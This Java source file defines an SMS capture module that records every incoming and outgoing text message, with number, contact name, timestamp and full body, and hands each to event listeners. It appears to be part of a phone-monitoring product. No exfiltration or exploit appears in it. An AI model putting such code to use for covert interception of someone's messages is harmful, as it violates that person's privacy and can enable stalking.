package com.vvt.smsc;

import com.vvt.event.FxEventCapture;
import com.vvt.event.FxSMSEvent;
import com.vvt.event.constant.FxDirection;
import com.vvt.global.Global;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSMessageMonitor;
import com.vvt.smsutil.SMSReceiverListener;
import com.vvt.smsutil.SMSSendListener;

public class SMSCapture extends FxEventCapture implements SMSReceiverListener, SMSSendListener {
	
	private SMSMessageMonitor smsMonitor = Global.getSMSMessageMonitor();
	
	public void startCapture() {
		try {
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
				setEnabled(true);
				smsMonitor.addSMSReceiverListener(this);
				smsMonitor.addSMSSendListener(this);
			}
		} catch(Exception e) {
			resetSMSCapture();
			notifyError(e);
		}
	}

	public void stopCapture() {
		try {
			if (isEnabled()) {
				setEnabled(false);
				smsMonitor.removeSMSReceiverListener(this);
				smsMonitor.removeSMSSendListener(this);
			}
		} catch(Exception e) {
			resetSMSCapture();
			notifyError(e);
		}
	}
	
	private void resetSMSCapture() {
		setEnabled(false);
		smsMonitor.removeSMSReceiverListener(this);
		smsMonitor.removeSMSSendListener(this);
	}
	
	private FxSMSEvent constructSMSEvent(FxSMSMessage smsMessage, FxDirection direction) {
		FxSMSEvent smsEvent = new FxSMSEvent();
		// To set sender number.
		smsEvent.setAddress(smsMessage.getNumber());
		// To set sender name.
		smsEvent.setContactName(smsMessage.getContactName());
		// To set direction.
		smsEvent.setDirection(direction);
		// To set event time.
		smsEvent.setEventTime(System.currentTimeMillis());
		// To set text message.
		smsEvent.setMessage(smsMessage.getMessage());
		return smsEvent;
	}

	// SMSReceiverListener
	public void onSMSReceived(FxSMSMessage smsMessage) {
		FxSMSEvent smsEvent = constructSMSEvent(smsMessage, FxDirection.IN);
		notifyEvent(smsEvent);
	}

	public void onSMSReceivedFailed(FxSMSMessage smsMessage, Exception e, String message) {
		notifyError(e);
	}
	
	// SMSSendListener
	public void smsSendSuccess(FxSMSMessage smsMessage) {
		FxSMSEvent smsEvent = constructSMSEvent(smsMessage, FxDirection.OUT);
		notifyEvent(smsEvent);
	}
	
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		notifyError(e);
	}
}
